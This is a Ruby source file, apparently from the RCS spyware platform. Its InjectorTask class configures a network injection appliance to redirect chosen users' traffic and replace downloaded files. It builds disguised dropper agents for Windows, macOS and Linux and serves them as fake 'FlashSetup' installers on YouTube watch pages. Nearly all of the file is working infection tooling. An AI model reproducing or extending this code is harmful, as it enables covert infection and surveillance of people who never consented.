require_relative '../tasks'

module RCS
module DB

class InjectorTask
  include RCS::DB::NoFileTaskType
  include RCS::Tracer

  def total
    injector = ::Injector.find(@params['injector_id'])
    injector.rules.where(:enabled => true).count + 2
  end
  
  def next_entry
    injector = ::Injector.find(@params['injector_id'])
    
    base = rand(10)
    progressive = 0
    redirect_user = {}
    redirect_url = []
    intercept_files = []
    vector_files = {}

    raise "Cannot send rules to a Network Injector that has never synchronized with the system" if injector.version == 0
    # TODO: check before release
    raise "Version too old, please update the Network Injector" if injector.version < 2013111101

    injector.rules.where(:enabled => true).each do |rule|

      # make sure to enable the scout on older rules
      if rule.scout.nil?
        rule.scout = true
        rule.save
      end

      tag = injector.redirection_tag + (base + progressive).to_s
      progressive += 1

      yield @description = "Creating rule No: #{progressive}"
      
      # use the key of the hash to avoid duplicates
      redirect_user["#{rule.ident} #{rule.ident_param}"] ||= tag

      # automatic patterns for rules
      rule.resource = '*.youtube.com/watch*' if rule.action == 'INJECT-HTML-FLASH'

      redirect_url << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.probability} #{rule.resource}"

      case rule.action
        when 'REPLACE', 'INJECT-HTML-FILE'
          vector_files[rule.action_param_name] = RCS::DB::GridFS.to_tmp(rule[:_grid])
          intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"

        when 'INJECT-EXE'
          # generate the cooked agent
          inject_exe(intercept_files, redirect_user, rule, vector_files)

        when 'INJECT-HTML-FLASH'
          inject_html_flash(intercept_files, progressive, redirect_user, rule, vector_files)

      end

    end

    yield @description = "Creating binary config"

    bin_config_file = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])

    Zip::OutputStream.open(bin_config_file) do |z|
      z.put_next_entry("redirect_user.txt")
      redirect_user.each_pair do |key, value|
        z.puts "#{key} #{value}"
      end

      z.put_next_entry("redirect_url.txt")
      z.puts "REDIRECT_PAGE = redirect.html"
      redirect_url.each do |value|
        z.puts value
      end

      z.put_next_entry("intercept_file.txt")
      intercept_files.each do |value|
        z.puts value
      end

      vector_files.each_pair do |filename, file|
        puts "#{filename} -> #{file}"
        z.put_next_entry("vectors/" + filename)
        z.write File.open(file, 'rb') {|f| f.read}
        FileUtils.rm_rf(file)
      end
    end

    trace :info, "Injector config file size: " + File.size(bin_config_file).to_s

    # make sure to delete the old one first
    GridFS.delete injector[:_grid] unless injector[:_grid].nil?

    # save the binary config into the grid, it will be requested by NC later
    injector[:_grid] = GridFS.put(File.open(bin_config_file, 'rb+'){|f| f.read}, {filename: injector[:_id].to_s})
    injector[:_grid_size] = File.size(bin_config_file)

    # delete the temp file
    FileUtils.rm_rf(bin_config_file)

    injector.configured = false
    injector.save

    yield @description = "Creating binary config"

    raise "Cannot push to #{injector.name}" unless Frontend.nc_push(injector.address)
    
    @description = "Rules applied successfully"
  end

  def inject_html_flash(intercept_files, progressive, redirect_user, rule, vector_files)
    appname = 'FlashSetup-' + progressive.to_s
    intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{appname} #{rule.resource}"

    begin
      # WINDOWS
      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
      # generate the dropper
      params = {'factory' => {'_id' => rule.action_param},
                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                'melt' => {'admin' => true, 'cooked' => true, 'appname' => appname, 'scout' => rule.scout}
      }
      build = Build.factory(:windows)
      build.create params
      FileUtils.cp build.path(build.outputs.first), temp_zip
      build.clean

      # extract the zip
      Zip::File.open(temp_zip) do |z|
        z.each do |f|
          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          z.extract(f, f_path) unless File.exist?(f_path)
          vector_files[f.name.gsub('.cooked', '.windows')] = f_path
        end
      end
      FileUtils.rm_rf(temp_zip)
    rescue Exception => e
      #raised if no license for that platform
      trace :error, e.message
    end

    begin
      # OSX
      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
      # generate the dropper
      params = {'factory' => {'_id' => rule.action_param},
                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                'melt' => {'admin' => false, 'appname' => appname + '.osx'}
      }
      build = Build.factory(:osx)
      build.create params
      FileUtils.cp build.path(build.outputs.first), temp_zip
      build.clean

      # extract the zip
      Zip::File.open(temp_zip) do |z|
        z.each do |f|
          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          z.extract(f, f_path) unless File.exist?(f_path)
          vector_files[f.name] = f_path
        end
      end
      FileUtils.rm_rf(temp_zip)
    rescue Exception => e
      #raised if no license for that platform
      trace :error, e.message
    end

    begin
      # LINUX
      temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
      # generate the dropper
      params = {'factory' => {'_id' => rule.action_param},
                'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
                'melt' => {'admin' => false, 'appname' => appname + '.linux'}
      }
      build = Build.factory(:linux)
      build.create params
      FileUtils.cp build.path(build.outputs.first), temp_zip
      build.clean

      # extract the zip
      Zip::File.open(temp_zip) do |z|
        z.each do |f|
          f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
          z.extract(f, f_path) unless File.exist?(f_path)
          vector_files[f.name] = f_path
        end
      end
      FileUtils.rm_rf(temp_zip)
    rescue Exception => e
      #raised if no license for that platform
      trace :error, e.message
    end

  end

  def inject_exe(intercept_files, redirect_user, rule, vector_files)
    factory = ::Item.where({_id: rule.action_param}).first
    intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{factory.ident} #{rule.resource}"

    temp_zip = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
    # generate the dropper
    params = {'factory' => {'_id' => rule.action_param},
              'binary' => {'demo' => LicenseManager.instance.limits[:nia][1]},
              'melt' => {'admin' => true, 'cooked' => true, 'appname' => factory.ident, 'scout' => rule.scout}
    }
    build = Build.factory(:windows)
    build.create params
    FileUtils.cp build.path(build.outputs.first), temp_zip
    build.clean

    # extract the zip
    Zip::File.open(temp_zip) do |z|
      z.each do |f|
        f_path = Config.instance.temp("%f-%s" % [Time.now, SecureRandom.hex(8)])
        z.extract(f, f_path) unless File.exist?(f_path)
        vector_files[f.name] = f_path
      end
    end
    FileUtils.rm_rf(temp_zip)
  end

end

end # DB
end # RCS